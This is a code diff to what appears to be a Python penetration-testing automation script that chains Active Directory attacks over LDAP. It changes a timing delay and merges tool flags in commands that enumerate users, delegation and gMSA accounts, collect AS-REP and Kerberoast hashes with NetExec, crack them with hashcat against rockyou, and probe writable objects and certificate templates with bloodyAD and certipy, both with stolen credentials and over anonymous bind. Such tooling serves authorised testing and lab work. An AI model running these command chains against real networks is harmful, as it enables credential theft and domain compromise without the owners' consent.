@@ -33,7 +33,7 @@ def run_task(context, command):
     target_pane = prepare_task_pane(context)
     if target_pane:
         if "nxc" in command:
-            target_pane.send_keys(f"sleep 5; {command}") # Prevents NetBIOSTimeout exception
+            target_pane.send_keys(f"sleep 6; {command}") # Prevents NetBIOSTimeout exception
         else:
             target_pane.send_keys(f"sleep {context.current_task_pane}; {command}")
     else:
@@ -111,7 +111,7 @@ def ldap_tasks(context):
     context.is_ad = True
     if context.creds_exist():
         user, passwd = context.get_initial_cred()
-        run_task(context, f"rusthound -d {context.domain} -u {user}@{context.domain} -p '{passwd}' -f {context.hostname}.{context.domain} -n {context.ip} -z -o rusthound; nxc ldap {context.ip} -u {user} -p '{passwd}' --users --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; nxc ldap {context.ip} -u {user} -p '{passwd}' --find-delegation --trusted-for-delegation; nxc ldap {context.ip} -u {user} -p '{passwd}' --gmsa; [ -f \"hashes.asreproast\" ] && hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force -o plaintext.asreproast; [ -f \"hashes.kerberoast\" ] && hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force -o plaintext.kerberoast")
+        run_task(context, f"rusthound -d {context.domain} -u {user}@{context.domain} -p '{passwd}' -f {context.hostname}.{context.domain} -n {context.ip} -z -o rusthound; nxc ldap {context.ip} -u {user} -p '{passwd}' --users --find-delegation --trusted-for-delegation --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; nxc ldap {context.ip} -u {user} -p '{passwd}' --gmsa; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
         run_task(context, f"bloodyAD --host {context.hostname}.{context.domain} -d {context.domain} -u {user} -p '{passwd}' get writable; certipy find -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout")
     else:
         # Check anonymous bind
@@ -119,7 +119,7 @@ def ldap_tasks(context):
         try:
             ldap_conn.login("","")
             write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
-            run_task(context, f"rusthound -d {context.domain} -f {context.hostname}.{context.domain} -n {context.ip} -z -o rusthound; unzip rusthound/* -d rusthound; nxc ldap {context.ip} -u '' -p '' --users --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; nxc ldap {context.ip} -u '' -p '' --find-delegation --trusted-for-delegation; nxc ldap {context.ip} -u '' -p '' --gmsa; [ -f \"hashes.asreproast\" ] && hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force -o plaintext.asreproast; [ -f \"hashes.kerberoast\" ] && hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force -o plaintext.kerberoast")
+            run_task(context, f"rusthound -d {context.domain} -f {context.hostname}.{context.domain} -n {context.ip} -z -o rusthound; unzip rusthound/* -d rusthound; nxc ldap {context.ip} -u '' -p '' --users --find-delegation --trusted-for-delegation --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; nxc ldap {context.ip} -u '' -p '' --gmsa; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force -o plaintext.asreproast; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
         except Exception as e:
             return
 
